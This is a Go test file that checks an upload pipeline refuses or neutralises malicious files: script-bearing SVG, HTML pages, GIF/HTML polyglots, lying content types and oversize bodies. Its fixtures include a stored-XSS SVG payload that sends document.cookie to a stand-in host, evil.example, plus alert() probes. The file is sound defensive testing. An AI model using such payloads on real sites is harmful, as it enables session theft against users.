// SPDX-License-Identifier: BUSL-1.1
// Copyright (c) 2026 Jérôme Bastian Winkel

// Gate SG-12: the upload matrix (security.md, threat T-11 and T-17).
//
// The matrix drives the components an upload passes through - the guard that sniffs and bounds,
// the domain policy that decides what may render, and the local store that keeps what was
// decided - with the files the threat model names: SVG, HTML, a polyglot, a lying content type,
// and a body past the limit. Each is refused, or comes out the other end inert: a download from
// a separate origin, never a rendering path (delivery adds `Content-Disposition: attachment` and
// `Content-Security-Policy: sandbox` in C-06; what this gate pins is that nothing upstream ever
// classifies such a file as inline-renderable).
package security

import (
	"bytes"
	"io"
	"strings"
	"testing"

	"github.com/Jersyfi/hubtask/core/domain/model/media"
	"github.com/Jersyfi/hubtask/core/domain/model/shared"
	storageport "github.com/Jersyfi/hubtask/core/port/storage"
	storage "github.com/Jersyfi/hubtask/infrastructure/storage"
)

const uploadLimit = 1 << 20

// svgBomb is a real SVG with a script inside - the classic stored-XSS payload of T-11.
const svgBomb = `<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg">` +
	`<script>document.location='https://evil.example/'+document.cookie</script></svg>`

const htmlPage = `<!DOCTYPE html><html><body><script>alert(document.domain)</script></body></html>`

// gifPolyglot begins as a valid GIF and carries HTML in its tail: the file that is two things at
// once, depending on who reads it.
var gifPolyglot = append([]byte("GIF89a"),
	[]byte(`<html><script>alert(1)</script></html>`)...)

func TestSG12TheMatrixNeverHandsOutARenderingPath(t *testing.T) {
	cases := []struct {
		name    string
		content []byte
		claimed string
		// refusedAs is set when the upload must not be stored at all; otherwise the stored type
		// must be inert: DeliveryFor answers a download.
		refusedAs string
	}{
		{name: "an SVG claimed honestly stays a download", content: []byte(svgBomb), claimed: "image/svg+xml"},
		{name: "an SVG claimed as nothing stays a download", content: []byte(svgBomb)},
		{name: "an HTML page claimed honestly stays a download", content: []byte(htmlPage), claimed: "text/html"},
		{name: "an HTML page claimed as nothing stays a download", content: []byte(htmlPage)},
		{
			name:    "an HTML page claimed as an image is refused",
			content: []byte(htmlPage), claimed: "image/png", refusedAs: "media.type_mismatch",
		},
		{
			name:    "an SVG claimed as a rendering image is refused",
			content: []byte(svgBomb), claimed: "image/gif", refusedAs: "media.type_mismatch",
		},
		{
			name:    "an HTML-first polyglot claimed as a GIF is refused",
			content: append([]byte(`<!DOCTYPE html><script>1</script>`), []byte("GIF89a")...),
			claimed: "image/gif", refusedAs: "media.type_mismatch",
		},
		{name: "a GIF-first polyglot is stored as the image it sniffs as", content: gifPolyglot, claimed: "image/gif"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			inspection, err := storage.Inspect(bytes.NewReader(tc.content), tc.claimed, uploadLimit)

			if tc.refusedAs != "" {
				if err == nil {
					t.Fatalf("accepted as %q, want a refusal", inspection.ContentType)
				}
				if got := shared.AsError(err).DetailCode; got != tc.refusedAs {
					t.Fatalf("refused as %q, want %s", got, tc.refusedAs)
				}
				return
			}
			if err != nil {
				t.Fatalf("refused: %v", err)
			}

			// Never text/html, whatever the file smuggled: the stored type decides delivery,
			// and this one must not be a page.
			if strings.Contains(inspection.ContentType, "html") &&
				media.DeliveryFor(inspection.ContentType) != media.DispositionAttachment {
				t.Fatalf("%q earned a rendering path", inspection.ContentType)
			}
			if tc.name == "a GIF-first polyglot is stored as the image it sniffs as" {
				// Inline as an image is inert for the HTML half: the served Content-Type is
				// image/gif under the global nosniff header, so no browser reads the tail as a
				// page - and the media origin adds sandbox on top (security.md §9).
				if inspection.ContentType != "image/gif" {
					t.Fatalf("the polyglot stored as %q", inspection.ContentType)
				}
				return
			}
			if media.DeliveryFor(inspection.ContentType) != media.DispositionAttachment {
				t.Fatalf("%q (from %s) earned a rendering path", inspection.ContentType, tc.name)
			}
		})
	}
}

// The stored type survives the round trip: what the sniff decided is what the store answers, so
// delivery decides from the judged type and never from anything a client said (T-11).
func TestSG12TheStoreServesTheJudgedTypeNotTheClaim(t *testing.T) {
	store := storage.NewLocalStorage(t.TempDir())

	inspection, err := storage.Inspect(strings.NewReader(svgBomb), "image/svg+xml", uploadLimit)
	if err != nil {
		t.Fatal(err)
	}
	if err := store.Put(t.Context(), storageport.Upload{
		Key: "media/svg", Content: inspection.Content, Size: int64(len(svgBomb)),
		ContentType: inspection.ContentType,
	}); err != nil {
		t.Fatal(err)
	}

	object, err := store.Get(t.Context(), "media/svg")
	if err != nil {
		t.Fatal(err)
	}
	defer object.Content.Close()

	if media.DeliveryFor(object.ContentType) != media.DispositionAttachment {
		t.Fatalf("the stored SVG serves as %q with a rendering path", object.ContentType)
	}
}

// T-17: an upload past the limit is refused at the boundary byte, with nothing allocated and
// nothing left behind.
func TestSG12AnOversizeUploadIsRefusedWithoutAllocation(t *testing.T) {
	store := storage.NewLocalStorage(t.TempDir())

	counted := &meter{source: endless{}}
	inspection, err := storage.Inspect(counted, "", uploadLimit)
	if err != nil {
		t.Fatal(err)
	}

	err = store.Put(t.Context(), storageport.Upload{
		Key: "media/bomb", Content: inspection.Content, Size: -1, ContentType: "text/plain",
	})
	if got := shared.AsError(err).DetailCode; got != "media.too_large" {
		t.Fatalf("the refusal arrived as %q", got)
	}
	if counted.read > uploadLimit+1 {
		t.Fatalf("the pipeline consumed %d bytes past a limit of %d", counted.read, uploadLimit)
	}
	if _, err := store.Get(t.Context(), "media/bomb"); err == nil {
		t.Fatal("the refused upload is servable")
	}
}

type endless struct{}

func (endless) Read(p []byte) (int, error) {
	for i := range p {
		p[i] = 'A'
	}
	return len(p), nil
}

type meter struct {
	source io.Reader
	read   int64
}

func (m *meter) Read(p []byte) (int, error) {
	n, err := m.source.Read(p)
	m.read += int64(n)
	return n, err
}
